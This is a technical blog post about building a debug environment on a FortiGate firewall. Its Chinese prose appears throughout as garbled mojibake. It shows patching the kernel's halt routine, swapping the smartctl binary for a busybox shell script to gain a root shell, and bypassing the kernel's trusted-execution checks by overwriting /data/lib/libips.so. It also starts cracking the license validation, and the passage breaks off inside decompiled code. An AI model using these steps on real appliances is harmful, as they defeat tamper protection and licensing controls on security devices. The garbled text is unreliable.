<p>æ‰€ä»¥æˆ‘ä»¬ç›´æ¥å°† do_halt çš„ç¬¬ä¸€æ¡æŒ‡ä»¤æ”¹ä¸º retï¼Œè·³è¿‡è¿™ä¸ªå‡½æ•°ï¼Œè¿™æ ·å°±ç®—æ ¡éªŒå¤±è´¥ä¹Ÿä¸ä¼šå¯¼è‡´ç³»ç»Ÿé‡å¯ã€‚</p>
<p>ç„¶åå‘ç³»ç»Ÿæ·»åŠ  busybox å’Œ shï¼Œå†å°† smartctl æ›¿æ¢æˆå¯åŠ¨ shell çš„è„šæœ¬</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">/bin/busybox sh -i</span><br></pre></td></tr></table></figure></div>

<p>é‡æ–°æ‰“åŒ… rootfs.gzï¼Œæ›¿æ¢æ‰åŸæ–‡ä»¶ã€‚</p>
<h2 id="å¯ä¿¡æ‰§è¡Œ"><a href="#å¯ä¿¡æ‰§è¡Œ" class="headerlink" title="å¯ä¿¡æ‰§è¡Œ"></a>å¯ä¿¡æ‰§è¡Œ</h2><p>è‡³æ­¤æˆ‘ä»¬å·²ç»å°†å†…æ ¸å’Œæ–‡ä»¶ç³»ç»Ÿä¸­éƒ¨åˆ†å®Œæ•´æ€§æ ¡éªŒç»•è¿‡ï¼Œå¹¶ä¸”æ— éœ€å…³å¿ƒ rootfs.gz åŠ è§£å¯†çš„é—®é¢˜ï¼Œå°†å†…æ ¸å’Œ rootfs.gz æ›¿æ¢ä¹‹åå°è¯•å¯åŠ¨</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env2_1.png"
                     
                ></p>
<p>ä» log ä¸­çœ‹åˆ°ç”±äºå®Œæ•´æ€§æ ¡éªŒå¤±è´¥è¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼Œä½†æ˜¯ç³»ç»Ÿä»ç„¶æˆåŠŸå¯åŠ¨å¹¶è¿›å…¥ç™»å½•ç•Œé¢ã€‚</p>
<p>ç™»å½•åæ‰§è¡Œ <code>diagnose hardware smartctl</code> å³å¯å¾—åˆ° SHELL æƒé™</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env2_2.png"
                     
                ></p>
<p>å½“å°è¯•ä½¿ç”¨ wget ä¸‹è½½æ–°çš„æ–‡ä»¶åˆ°ç³»ç»Ÿå¹¶æ‰§è¡Œæ—¶ï¼Œç³»ç»Ÿä¼šé‡æ–°å¯åŠ¨ã€‚åœ¨å®˜æ–¹æ–‡æ¡£æ‰¾åˆ°äº†å¯¼è‡´è¿™ä¸€é—®é¢˜çš„åŸå› ï¼š<a class="link"   href="https://docs.fortinet.com/document/fortigate/7.4.0/new-features/226732/real-time-file-system-integrity-checking" >https://docs.fortinet.com/document/fortigate/7.4.0/new-features/226732/real-time-file-system-integrity-checking<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>æ–°ç‰ˆæœ¬æ·»åŠ äº†å®æ—¶å®Œæ•´æ€§æ£€æŸ¥ï¼Œå³å¯ä¿¡æ‰§è¡Œï¼Œåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶å†…æ ¸ä¼šç»Ÿè®¡å…³é”®æ–‡ä»¶çš„ hash å€¼å¹¶å­˜æ”¾åˆ°å†…å­˜ï¼Œå½“æ‰§è¡Œç¨‹åºæ—¶å†…æ ¸éªŒè¯è¿™ä¸ªç¨‹åºçš„ hash æ˜¯å¦å’ŒåŸå§‹å€¼ç›¸åŒï¼Œå¦‚æœä¸åŒæˆ–ä¸å­˜åœ¨ï¼Œåˆ™è¯´æ˜è¯¥ç¨‹åºéæ³•ï¼Œä¼šå¯¼è‡´ç³»ç»Ÿç›´æ¥é‡å¯ã€‚</p>
<p>ä¸è¿‡æˆ‘ä»¬ç¦»çº¿æ·»åŠ çš„ busybox ç­‰ç¨‹åºèƒ½å¤Ÿæ­£å¸¸æ‰§è¡Œï¼Œå› æ­¤åªéœ€è¦å°†æƒ³è¦è¿è¡Œçš„ç¨‹åºæå‰æ·»åŠ åˆ°ç£ç›˜ä¸­(bin.tar.xz)ï¼Œè¿›å…¥ç³»ç»Ÿå°±èƒ½æ­£å¸¸ä½¿ç”¨ã€‚ä¾‹å¦‚å†å‘ç³»ç»Ÿæ·»åŠ ä¸€ä¸ª gdbserver ç¨‹åºï¼Œé‡æ–°å¯åŠ¨åå¯æ­£å¸¸è¿è¡Œã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env2_3.png"
                     
                ></p>
<p>é€šè¿‡é˜…è¯»å®˜æ–¹æ–‡æ¡£å¾—çŸ¥ï¼Œæ–°ç‰ˆæœ¬æ·»åŠ çš„å¯ä¿¡æ‰§è¡Œæ ¡éªŒä½äºå†…æ ¸ä¸­ï¼Œå…·ä½“æ¥è¯´ï¼Œå¼€å‘è€…åˆ©ç”¨ Linux çš„ IMA(å®Œæ•´æ€§å­ç³»ç»Ÿ) å®ç°äº†ä¸€å¥—è¿è¡Œæ—¶æ–‡ä»¶å®Œæ•´æ€§æ ¡éªŒã€‚æ­¤å¤–è¿˜é€šè¿‡ LSM(Linux Security Module) æ¡†æ¶å®ç°äº†è®¿é—®æ§åˆ¶ç³»ç»Ÿã€‚</p>
<p>é€†å‘åˆ†æå†…æ ¸ï¼Œå®šä½åˆ° <code>forti_security_module_init</code> å‡½æ•°ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">forti_security_module_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> security_add_hooks(&amp;fortism_func_list, <span class="number">5LL</span>, aFortiSecurityM);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªå‡½æ•°é€šè¿‡ <code>security_add_hooks</code> æ³¨å†Œ LSM çš„ handlerï¼Œåœ¨ <code>fortism_func_list</code> å‡½æ•°åˆ—è¡¨ä¸­åŒ…å« <code>fortism_file_open</code>ã€<code>fortism_path_link</code>ã€<code>fortism_path_rename</code>ã€<code>fortism_kernel_load_data</code>ã€<code>fortism_sb_mount</code> äº”ä¸ªå‡½æ•°ï¼Œå®ç°äº†å¯¹æ–‡ä»¶ã€ç¬¦å·é“¾æ¥ã€å†…æ ¸æ¨¡å—ã€ç£ç›˜æŒ‚è½½ç­‰æ“ä½œçš„è®¿é—®æ§åˆ¶ã€‚æˆ‘ä»¬ä»¥ <code>fortism_file_open</code> å‡½æ•°ä¸ºä¾‹ç®€è¦åˆ†æã€‚<code>fortism_file_open</code> æœ€ç»ˆä¼šè°ƒç”¨ <code>fortism_file_open_part_0</code>ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">fortism_file_open_part_0</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  v8 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = d_path(a1 + <span class="number">16</span>, v7, <span class="number">511</span>);</span><br><span class="line">  v2 = result;</span><br><span class="line">  v3 = paths;</span><br><span class="line">  <span class="keyword">if</span> ( result &lt;= <span class="number">0xFFFFFFFFFFFFF000</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="built_in">strlen</span>(*v3);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(v2, *v3, v4) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ++v3 == &amp;qword_FFFFFFFF8165F678 )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = paths2;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="built_in">strlen</span>(*v5);</span><br><span class="line">      result = <span class="built_in">strncmp</span>(v2, *v5, v6);</span><br><span class="line">      <span class="keyword">if</span> ( !result )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ++v5 == paths )</span><br><span class="line">        <span class="keyword">return</span> fortism_file_open_part_0_cold();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_5:</span><br><span class="line">  <span class="keyword">if</span> ( v8 != __readgsqword(<span class="number">0x28</span>u) )</span><br><span class="line">    JUMPOUT(<span class="number">0xFFFFFFFF8055054F</span>LL);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ­¤å‡½æ•°ä¼šéå†ä¸¤ä¸ªå…¨å±€æ•°ç»„ï¼Œæ•°ç»„ä¸­åŒ…å«ä¸€äº›è·¯å¾„</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/migadmin/fortiguard_resources</span><br><span class="line">/node-scripts/report-runner</span><br><span class="line">/node-scripts/logs</span><br><span class="line">/node-scripts/http-config.json</span><br><span class="line">/bin</span><br><span class="line">/migadmin</span><br><span class="line">/node-scripts</span><br><span class="line">/sbin</span><br><span class="line">/tools</span><br><span class="line">/usr</span><br><span class="line">/lib</span><br><span class="line">/lib64</span><br><span class="line">/data/rootfs.gz</span><br><span class="line">/data/datafs.tar.gz</span><br><span class="line">/data/flatkc</span><br></pre></td></tr></table></figure></div>

<p>å½“ä¼ å…¥çš„å‚æ•°åŒ¹é…ä»¥ä¸Šè·¯å¾„æ—¶ï¼Œå‡½æ•°æ‰“å°å¤±è´¥ä¿¡æ¯ <code>try to write readonly file(xxx)</code> å¹¶è¿”å›è´Ÿæ•°å€¼ã€‚è¿™ä¸€ç‚¹å¯ä»¥åœ¨ SHELL ä¸­éªŒè¯ï¼Œä¾‹å¦‚æˆ‘ä»¬å°è¯•åœ¨ &#x2F;bin ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª testfile æ–‡ä»¶ï¼Œä¼šå‡ºç°é”™è¯¯ä¿¡æ¯</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env2_5.png"
                     
                ></p>
<p>å¦å¤–å†…æ ¸ä¸­åˆå­˜åœ¨ <code>ima_file_mmap</code> å‡½æ•°ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">ima_file_mmap</span><span class="params">(__int64 file, <span class="type">char</span> prot)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">4</span>]; <span class="comment">// [rsp+4h] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !file || (prot &amp; <span class="number">4</span>) == <span class="number">0</span> )               <span class="comment">// PROT_EXEC</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  security_task_getsecid(__readgsqword(&amp;off_14D80), v3);</span><br><span class="line">  <span class="keyword">return</span> fos_process_appraise_constprop_0(file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æœ€ç»ˆè°ƒç”¨ <code>fos_process_appraise_constprop_0</code></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">fos_process_appraise_constprop_0</span><span class="params">(<span class="type">unsigned</span> __int64 file)</span></span><br><span class="line">&#123;</span><br><span class="line">  v32 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  inode = *(file + <span class="number">32</span>);</span><br><span class="line">  v2 = integrity_iint_find(inode);</span><br><span class="line">  <span class="keyword">if</span> ( need_ima_check != <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = v2;</span><br><span class="line">    v4 = d_path(file + <span class="number">16</span>, v30, <span class="number">511</span>);</span><br><span class="line">    v5 = v4;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">0xFFFFFFFFFFFFF000</span>LL )</span><br><span class="line">      <span class="keyword">return</span> fos_process_appraise_constprop_0_cold();</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v24 = <span class="number">3</span>;</span><br><span class="line">      v26 = dword_FFFFFFFF8165F6B4;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; ; i = <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v29[i] = <span class="number">0LL</span>;</span><br><span class="line">          v29[i + <span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">          v29[i + <span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">          v29[i + <span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">          i += <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( i &lt; <span class="number">8</span> );</span><br><span class="line">        result = ima_calc_file_hash(file, &amp;v26);<span class="comment">// è®¡ç®—æ–‡ä»¶ hash å€¼</span></span><br><span class="line">        <span class="keyword">if</span> ( !result )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !--v24 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( result &lt; <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v27 = <span class="number">0</span>;</span><br><span class="line">        v28 = <span class="number">0</span>;</span><br><span class="line">        v26 = dword_FFFFFFFF8165F6B4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(*(v3 + <span class="number">112</span>) + <span class="number">4LL</span>, v29, *(*(v3 + <span class="number">112</span>) + <span class="number">1LL</span>)) )<span class="comment">// æ¯”è¾ƒ hash å€¼</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      ima_pr_emerg(<span class="number">3LL</span>, v5);</span><br><span class="line">      fos_print_hash_isra_0(aNew, v29, *(*(v3 + <span class="number">112</span>) + <span class="number">1LL</span>), v12, v13, v14);</span><br><span class="line">      fos_print_hash_isra_0(aOld, (*(v3 + <span class="number">112</span>) + <span class="number">4LL</span>), *(*(v3 + <span class="number">112</span>) + <span class="number">1LL</span>), v15, v16, v17);</span><br><span class="line">      printk(&amp;unk_FFFFFFFF81401B64, *(inode + <span class="number">80</span>), v18, v19, v20, v21);</span><br><span class="line">      time64_to_tm(*(inode + <span class="number">104</span>), <span class="number">0LL</span>, v25);</span><br><span class="line">      v23 = v25[<span class="number">0</span>];</span><br><span class="line">      printk(&amp;unk_FFFFFFFF81401C48, aModifiedTime, v25[<span class="number">6</span>] + <span class="number">1900</span>, v25[<span class="number">4</span>] + <span class="number">1</span>, v25[<span class="number">3</span>], v25[<span class="number">2</span>]);</span><br><span class="line">      logmsg = fos_ima_get_logmsg(<span class="number">3LL</span>);</span><br><span class="line">      (_fgtlog_vf_text_0[<span class="number">0</span>])(<span class="number">36864LL</span>, <span class="number">255LL</span>, <span class="number">255LL</span>, <span class="number">20234LL</span>, <span class="number">0LL</span>, logmsg, v5, v23);</span><br><span class="line">failed:</span><br><span class="line">      msleep(<span class="number">5000LL</span>);</span><br><span class="line">      kernel_restart(<span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFF3</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v8 = off_FFFFFFFF8165F6A0[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(off_FFFFFFFF8165F6A0[<span class="number">0</span>], v4) )  <span class="comment">// /data/lib/libav.so</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = off_FFFFFFFF8165F6A8;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(off_FFFFFFFF8165F6A8, v5) )   <span class="comment">// /data/lib/libips.so</span></span><br><span class="line">      &#123;</span><br><span class="line">        ima_pr_emerg(<span class="number">1LL</span>, v5);</span><br><span class="line">        v9 = <span class="number">1LL</span>;</span><br><span class="line">failed2:</span><br><span class="line">        v10 = fos_ima_get_logmsg(v9);</span><br><span class="line">        (_fgtlog_vf_text_0[<span class="number">0</span>])(<span class="number">36864LL</span>, <span class="number">255LL</span>, <span class="number">255LL</span>, <span class="number">20233LL</span>, <span class="number">0LL</span>, v10, v5);</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(v31, <span class="number">0</span>, <span class="keyword">sizeof</span>(v31));</span><br><span class="line">    <span class="built_in">snprintf</span>(v31, <span class="number">511</span>, aSX_0, v8);</span><br><span class="line">    <span class="keyword">if</span> ( fos_verify_pkcs7(file, v5, v31) &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( sys_security_level != <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( sys_security_level == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          ima_pr_warning(<span class="number">0</span>);</span><br><span class="line">          v11 = fos_ima_get_logmsg(<span class="number">0LL</span>);</span><br><span class="line">          (_fgtlog_vf_text_0[<span class="number">0</span>])(<span class="number">36864LL</span>, <span class="number">255LL</span>, <span class="number">255LL</span>, <span class="number">20233LL</span>, <span class="number">0LL</span>, v11, v5);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !sys_security_level )</span><br><span class="line">        &#123;</span><br><span class="line">          ima_pr_warning(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      ima_pr_emerg(<span class="number">0LL</span>, v5);</span><br><span class="line">      v9 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">goto</span> failed2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç®€å•æ¥è¯´ï¼Œå‡½æ•°ä¼šå…ˆåˆ¤æ–­å½“å‰æ˜¯å¦å¼€å¯äº† IMA éªŒè¯ï¼ŒIMA å¯ä»¥é€šè¿‡ä¿®æ”¹ <code>/sys/kernel/security/integrity/fos/fix_to_enforce</code> å€¼æ¥å¼€å¯æˆ–å…³é—­ã€‚åœ¨ init ç¨‹åºä¸­ä¹Ÿèƒ½æ‰¾åˆ°ç›¸å…³ä»£ç </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">enforce_fos_integrity</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// rax</span></span><br><span class="line">  FILE *v1; <span class="comment">// r12</span></span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">&quot;/sys/kernel/security/integrity/fos/fix_to_enforce&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = v0;</span><br><span class="line">    fputc(<span class="string">&#x27;1&#x27;</span>, v0);</span><br><span class="line">    fclose(v1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_23338D0(<span class="string">&quot;Failed to enforce FortiOS Security Enforce mode\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¸è¿‡å®é™…æµ‹è¯•å‘ç°ä¿®æ”¹æ­¤æ–‡ä»¶å¹¶ä¸èƒ½å…³é—­ IMA éªŒè¯ï¼ŒåŸå› æš‚æ—¶æœªçŸ¥ã€‚</p>
<p>ç»§ç»­è§‚å¯Ÿ <code>fos_process_appraise_constprop_0</code>ï¼Œå½“åœ¨ç¼“å­˜ä¸­æ‰¾ä¸åˆ°å¾…éªŒè¯æ–‡ä»¶çš„ Hash æ—¶ï¼Œä»£ç åˆ¤æ–­è¿™ä¸ªæ–‡ä»¶æ˜¯å¦ä¸º <code>/data/lib/libav.so</code> æˆ–è€… <code>/data/lib/libips.so</code>ï¼Œå¦‚æœæ˜¯äºŒè€…ä¹‹ä¸€ï¼Œè°ƒç”¨ <code>fos_verify_pkcs7</code> æ£€æŸ¥æ–‡ä»¶ç­¾åã€‚</p>
<p>å¦‚æœæ£€æŸ¥å¤±è´¥ï¼Œåº”è¯¥è¿”å›é”™è¯¯å¹¶é‡å¯ç³»ç»Ÿï¼Œä½†è¿™é‡Œåœ¨å¤±è´¥çš„æƒ…å†µä¸‹ä»…æ‰“å°äº† log ä¿¡æ¯ï¼Œå‡½æ•°ç»§ç»­å‘ä¸‹æ‰§è¡Œå¹¶è¿”å› 0ï¼Œè¡¨ç¤ºéªŒè¯é€šè¿‡ã€‚</p>
<p>&#x2F;data&#x2F;lib ç›®å½•ä¸åœ¨è®¿é—®æ§åˆ¶çš„èŒƒå›´å†…ï¼Œä¸”ä»£ç å¯¹è¿™ä¸¤ä¸ªæ–‡ä»¶ç¼ºä¹æ ¡éªŒï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•è‡ªå·±ç¼–å†™ç¨‹åºè¦†ç›–å…¶ä¸­ä¹‹ä¸€ï¼Œçœ‹çœ‹èƒ½å¦ç»•è¿‡å¯ä¿¡æ‰§è¡Œã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env2_6.png"
                     
                ></p>
<p>è™½ç„¶å†…æ ¸ log ä¸­ç•™ä¸‹äº†åŠ è½½éæ³•æ–‡ä»¶çš„æç¤ºï¼Œä½†ç¨‹åºä¾ç„¶æˆåŠŸæ‰§è¡Œï¼ŒéªŒè¯äº†å‰é¢çš„åˆ†æã€‚</p>
<h2 id="ç ´è§£-License"><a href="#ç ´è§£-License" class="headerlink" title="ç ´è§£ License"></a>ç ´è§£ License</h2><p>åœ¨ä¹‹å‰çš„æ–‡ç« ä¸­ä»‹ç»äº†å¦‚ä½•ç”Ÿæˆæµ‹è¯•ç‰ˆ Licenseï¼Œæ–°ç‰ˆä»£ç ä¿®æ”¹äº†éªŒè¯é€»è¾‘ï¼Œå¯¼è‡´ä»¥å‰ç”Ÿæˆçš„ License æ— æ³•æ­£å¸¸ä½¿ç”¨ã€‚</p>
<p>æ–°çš„éªŒè¯å‡½æ•°ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">do_process_license</span><span class="params">(<span class="type">char</span> *license_data, __int64 a2, <span class="type">char</span> *lic_struct)</span></span><br><span class="line">&#123;</span><br><span class="line">  v61 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *lic_struct = <span class="number">0LL</span>;</span><br><span class="line">  *(lic_struct + <span class="number">20</span>) = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(</span><br><span class="line">    ((lic_struct + <span class="number">8</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL),</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">8LL</span> * ((lic_struct - ((lic_struct + <span class="number">8</span>) &amp; <span class="number">0xFFFFFFF8</span>) + <span class="number">168</span>) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">  *(lic_struct + <span class="number">20</span>) = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( license_data )</span><br><span class="line">  &#123;</span><br><span class="line">    license_start = <span class="built_in">strstr</span>(license_data, <span class="string">&quot;-----BEGIN FGT VM LICENSE-----&quot;</span>);</span><br><span class="line">    license_end = <span class="built_in">strstr</span>(license_data, <span class="string">&quot;-----END FGT VM LICENSE-----&quot;</span>);</span><br><span class="line">    license_end_1 = license_end;</span><br><span class="line">    <span class="keyword">if</span> ( license_start )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( license_end )</span><br><span class="line">      &#123;</span><br><span class="line">        license_body = license_start + <span class="number">30</span>;</span><br><span class="line">        <span class="keyword">if</span> ( license_end &gt; license_start + <span class="number">30</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = *__ctype_b_loc();</span><br><span class="line">          <span class="keyword">while</span> ( (v7[*license_body] &amp; <span class="number">0x2000</span>) != <span class="number">0</span> )<span class="comment">// æ£€æŸ¥å­—ç¬¦æ˜¯å¦åˆæ³•</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( license_end_1 == ++license_body )</span><br><span class="line">              <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( license_end_1 &gt; license_body )</span><br><span class="line">          &#123;</span><br><span class="line">            license_end_1_1 = license_end_1;</span><br><span class="line">            <span class="keyword">while</span> ( (v7[*license_end_1_1] &amp; <span class="number">0x2000</span>) != <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( --license_end_1_1 == license_body )</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( license_end_1_1 &gt; license_body )</span><br><span class="line">            &#123;</span><br><span class="line">              *license_end_1_1 = <span class="number">0</span>;</span><br><span class="line">              v48 = <span class="number">3</span> * ((license_end_1_1 - license_body + <span class="number">3</span>) &gt;&gt; <span class="number">2</span>);</span><br><span class="line">              decoded_license = <span class="built_in">malloc</span>(v48);</span><br><span class="line">              <span class="keyword">if</span> ( decoded_license )</span><br><span class="line">              &#123;</span><br><span class="line">                b64_decoded_len = base64_decode(license_body, decoded_license, v48);</span><br><span class="line">                *license_end_1_1 = <span class="number">45</span>;</span><br><span class="line">                b64_decoded_len_1 = b64_decoded_len;</span><br><span class="line">                <span class="keyword">if</span> ( !b64_decoded_len )</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_74;</span><br><span class="line">                cms_start = <span class="built_in">strstr</span>(license_data, <span class="string">&quot;-----BEGIN CMS-----&quot;</span>);<span class="comment">// æ–°å¢çš„å­—æ®µ</span></span><br><span class="line">                cmd_end = <span class="built_in">strstr</span>(license_data, <span class="string">&quot;-----END CMS-----&quot;</span>);</span><br><span class="line">                b64_decoded_len_1_1 = b64_decoded_len_1;</span><br><span class="line">                <span class="keyword">if</span> ( cms_start &amp;&amp; cmd_end )</span><br><span class="line">                &#123;</span><br><span class="line">                  v38 = <span class="number">0LL</span>;</span><br><span class="line">                  cms_len = cmd_end + <span class="number">17</span> - cms_start;</span><br><span class="line">                  v40 = <span class="number">0LL</span>;</span><br><span class="line">                  v41 = license_end_1 + <span class="number">28</span> - license_start;</span><br><span class="line">                  <span class="keyword">if</span> ( v41 )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="keyword">while</span> ( v41 != ++v40 )</span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="keyword">while</span> ( license_start[v40] == <span class="number">10</span> &amp;&amp; license_start[v40 - <span class="number">1</span>] != <span class="number">13</span> )</span><br><span class="line">                      &#123;</span><br><span class="line">                        ++v40;</span><br><span class="line">                        ++v38;</span><br><span class="line">                        <span class="keyword">if</span> ( v41 == v40 )</span><br><span class="line">                          <span class="keyword">goto</span> LABEL_66;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">LABEL_66:</span><br><span class="line">                    v42 = v41 + v38;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    v42 = <span class="number">0LL</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                  v43 = <span class="built_in">malloc</span>(v42);</span><br><span class="line">                  b64_decoded_len_1_1 = b64_decoded_len_1;</span><br><span class="line">                  <span class="keyword">if</span> ( v43 )</span><br><span class="line">                  &#123;</span><br><span class="line">                    sub_2DCE5F0(license_start, v41, v43, v42);</span><br><span class="line">                    ptrc = v44;</span><br><span class="line">                    v45 = do_check_cms_license(v44, v42, cms_start, cms_len);<span class="comment">// æ£€æŸ¥ cms å†…å®¹</span></span><br><span class="line">                    <span class="built_in">free</span>(ptrc);</span><br><span class="line">                    b64_decoded_len_1_1 = b64_decoded_len_1;</span><br><span class="line">                    <span class="keyword">if</span> ( v45 == 